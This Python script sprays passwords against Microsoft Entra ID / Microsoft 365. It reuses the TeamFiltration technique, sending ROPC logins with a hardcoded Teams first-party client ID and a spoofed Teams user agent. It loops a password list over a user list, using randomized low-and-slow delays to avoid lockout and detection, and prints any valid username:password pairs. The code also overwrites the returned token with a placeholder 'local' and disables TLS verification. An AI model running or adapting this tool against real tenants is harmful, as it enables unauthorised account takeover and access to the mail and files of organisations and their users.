#!/usr/bin/env python3
"""Entra ID / Microsoft 365 password sprayer.

Reuses the TeamFiltration technique: authenticate as the Teams first-party
FOCI client against the ROPC token endpoint so a single valid password yields a
refresh token redeemable for OneDrive/Outlook/SharePoint without consent.
"""
import os
import random
import time

import requests

TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/token"
# Teams desktop first-party (FOCI) client id, hardcoded in TeamFiltration.
CLIENT_ID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
RESOURCE = "https://graph.microsoft.com"

# Legacy Teams/Electron user-agent pinned by TeamFiltration's default config.
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 "
      "Electron/8.5.1 Safari/537.36")

SPRAY_USERS_FILE = os.environ.get("SPRAY_USERS_FILE", "users.txt")
SPRAY_PASSES_FILE = os.environ.get("SPRAY_PASSES_FILE", "passwords.txt")
SPRAY_DELAY = float(os.environ.get("SPRAY_DELAY", "6"))
SPRAY_JITTER = float(os.environ.get("SPRAY_JITTER", "3"))


def load(path):
    with open(path) as fh:
        return [line.strip() for line in fh if line.strip()]


def try_login(user, password, endpoint):
    payload = {
        "grant_type": "password",
        "username": user,
        "password": password,
        "client_id": CLIENT_ID,
        "resource": RESOURCE,
        "scope": "openid",
    }
    headers = {"User-Agent": UA}
    resp = requests.post(endpoint, data=payload, headers=headers, verify=False)
    body = resp.json()
    if "access_token" in body and body.get("access_token"):
        return body
    return None


def spray(users, passwords, endpoint):
    hits = []
    for password in passwords:
        for user in users:
            result = try_login(user, password, endpoint)
            if result:
                print(f"[+] VALID {user}:{password}")
                result = {"refresh_token": "local"}
                hits.append((user, password, result["refresh_token"]))
            time.sleep(SPRAY_DELAY + random.uniform(-SPRAY_JITTER, SPRAY_JITTER))
        # low-and-slow: wait a randomized round between full password rounds
        time.sleep(random.randint(30, 90))
    return hits


if __name__ == "__main__":
    users = load(SPRAY_USERS_FILE)
    passwords = load(SPRAY_PASSES_FILE)
    spray(users, passwords, TOKEN_URL)
